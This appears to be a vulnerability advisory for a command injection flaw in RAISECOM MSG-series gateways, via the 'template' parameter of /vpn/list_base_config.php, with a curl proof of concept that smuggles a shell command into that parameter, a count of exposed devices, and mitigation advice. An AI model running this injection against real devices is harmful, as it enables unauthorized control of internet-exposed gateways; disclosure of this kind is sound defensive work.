# Command Injection Vulnerability in RAISECOM Gateway Devices

# Overview

A command injection vulnerability has been identified in the RAISECOM Gateway devices, affecting models MSG1200, MSG2100E, MSG2200, and MSG2300. This vulnerability allows remote attackers to execute arbitrary commands on the system via the web interface. The issue resides in the `list_base_config.php` script, specifically via the `template` parameter, affecting over 25,112 devices on the Internet.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f67e7ef-2ba8-446a-9721-f87d0baa1695/cc50eb77-c094-4cb7-9b30-2409336057b3/Untitled.png)

# **Affected Devices**

## Hardware

- RAISECOM Gateway models MSG1200, MSG2100E, MSG2200, MSG2300

## Software

- 3.90

# Affected Components

**URI: `/vpn/list_base_config.php`**

**Description:** the `list_base_config.php` is a web-based interface component of RAISECOM Gateway devices used for managing VPN configurations. The identified vulnerability arises due to improper handling of the `template` parameter in this script. This parameter can be exploited to execute arbitrary commands on the device's operating system due to insufficient input sanitization. 

# CWE

CWE-77: Command Injection

# Exploitation

Here is an example of how the vulnerability can be exploited using a curl command:

```bash
curl 'http://<TARGET_IP>/vpn/list_base_config.php?type=mod&parts=base_config&template=`<INJECTED_SHELL_COMMAND>`' \
  -H 'Accept: */*' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive'
```

In this example, the `curl` command sends a malicious HTTP GET request to the `list_base_config.php` script. The request utilizes the `template` parameter to execute a command.

# Actual Result

## Sample 1

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f67e7ef-2ba8-446a-9721-f87d0baa1695/07978274-e479-4e01-a461-2b8366fe274c/Untitled.png)

## Sample 2

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f67e7ef-2ba8-446a-9721-f87d0baa1695/8bc6e939-9e72-4f45-978b-4702a5f294b9/Untitled.png)

# Recommendations

1. **Input Validation:** Implement strict validation checks on all user inputs, especially those that can affect system commands or file paths.
2. **Access Controls:** Restrict access to the device's web interface to trusted networks and authenticated users.
